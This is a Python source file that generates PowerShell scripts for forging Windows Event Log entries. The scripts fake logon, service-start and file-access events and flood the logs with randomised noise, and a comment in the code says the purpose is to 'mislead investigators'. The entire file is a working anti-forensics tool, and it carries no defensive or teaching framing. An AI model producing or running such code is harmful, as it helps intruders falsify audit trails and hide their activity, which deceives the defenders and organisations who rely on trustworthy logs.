"""
PowerShell Event Log Injector Script Generator
Generates PowerShell scripts for injecting false events into Windows Event Logs
"""


class EventLogInjector:
    """
    Generate PowerShell scripts for injecting false events
    
    Provides methods to generate scripts for:
    - Injecting false logon events
    - Injecting service events
    - Injecting file access events
    - Creating event noise
    """
    
    @staticmethod
    def get_injection_script():
        """
        Get PowerShell script for event injection
        
        Returns:
            str: Complete PowerShell script for event injection
        """
        script = '''
# Event Log Injection
# Create false events to mislead investigators

function Inject-LogonEvent {
    param(
        [string]$Username = "Administrator",
        [string]$Domain = $env:USERDOMAIN,
        [string]$SourceIP = "192.168.1.100",
        [datetime]$Timestamp = (Get-Date)
    )
    
    # Create custom event source if needed
    $source = "CustomSecurity"
    
    if (-not [System.Diagnostics.EventLog]::SourceExists($source)) {
        New-EventLog -LogName Application -Source $source
    }
    
    # Inject false logon event
    $message = @"
Successful logon:
    User: $Domain\\$Username
    Source IP: $SourceIP
    Logon Type: 3 (Network)
    Time: $Timestamp
"@
    
    Write-EventLog -LogName Application -Source $source -EventId 4624 -EntryType Information -Message $message
    
    Write-Host "[+] Injected false logon event for $Domain\\$Username"
}

function Inject-ServiceStart {
    param(
        [string]$ServiceName = "UpdateService",
        [datetime]$Timestamp = (Get-Date)
    )
    
    $source = "CustomSystem"
    
    if (-not [System.Diagnostics.EventLog]::SourceExists($source)) {
        New-EventLog -LogName System -Source $source
    }
    
    $message = "Service '$ServiceName' started successfully."
    
    Write-EventLog -LogName System -Source $source -EventId 7036 -EntryType Information -Message $message
    
    Write-Host "[+] Injected service start event"
}

function Inject-FileAccess {
    param(
        [string]$FilePath = "C:\\Users\\Public\\document.docx",
        [string]$Username = $env:USERNAME,
        [datetime]$Timestamp = (Get-Date)
    )
    
    $source = "CustomAudit"
    
    if (-not [System.Diagnostics.EventLog]::SourceExists($source)) {
        New-EventLog -LogName Security -Source $source
    }
    
    $message = @"
File accessed:
    Path: $FilePath
    User: $Username
    Access: Read
    Time: $Timestamp
"@
    
    Write-EventLog -LogName Security -Source $source -EventId 4663 -EntryType SuccessAudit -Message $message
    
    Write-Host "[+] Injected file access event"
}

# Create noise - legitimate-looking events
function Create-EventNoise {
    param([int]$Count = 100)
    
    Write-Host "[*] Creating $Count noise events..."
    
    $randomIPs = @("10.0.0.", "192.168.1.", "172.16.0.") | Get-Random
    
    for ($i = 0; $i -lt $Count; $i++) {
        $ip = "$randomIPs$(Get-Random -Minimum 1 -Maximum 254)"
        $users = @("jsmith", "bjones", "mwilliams", "tgarcia", "slee")
        $user = $users | Get-Random
        
        Inject-LogonEvent -Username $user -SourceIP $ip
        
        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
    }
    
    Write-Host "[+] Event noise created"
}

Write-Host "[*] Event injection script loaded"
Write-Host "[*] Available functions:"
Write-Host "    Inject-LogonEvent"
Write-Host "    Inject-ServiceStart"
Write-Host "    Inject-FileAccess"
Write-Host "    Create-EventNoise"
'''
        return script
    
    @staticmethod
    def get_custom_injection_script(event_id, log_name, message):
        """
        Generate a custom event injection script
        
        Args:
            event_id (int): Event ID to inject
            log_name (str): Log name (Security, System, Application)
            message (str): Event message
            
        Returns:
            str: PowerShell script for custom event injection
        """
        script = f'''
# Custom Event Injection
$source = "CustomEvent"

if (-not [System.Diagnostics.EventLog]::SourceExists($source)) {{
    New-EventLog -LogName {log_name} -Source $source
}}

$message = @"
{message}
"@

Write-EventLog -LogName {log_name} -Source $source -EventId {event_id} -EntryType Information -Message $message

Write-Host "[+] Custom event injected - ID: {event_id}, Log: {log_name}"
'''
        return script
    
    @staticmethod
    def save_script(script_content, output_path):
        """
        Save PowerShell script to file
        
        Args:
            script_content (str): PowerShell script content
            output_path (str): Path where script should be saved
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(script_content)
            print(f"[+] PowerShell script saved: {output_path}")
            return True
        except Exception as e:
            print(f"[-] Failed to save script: {e}")
            return False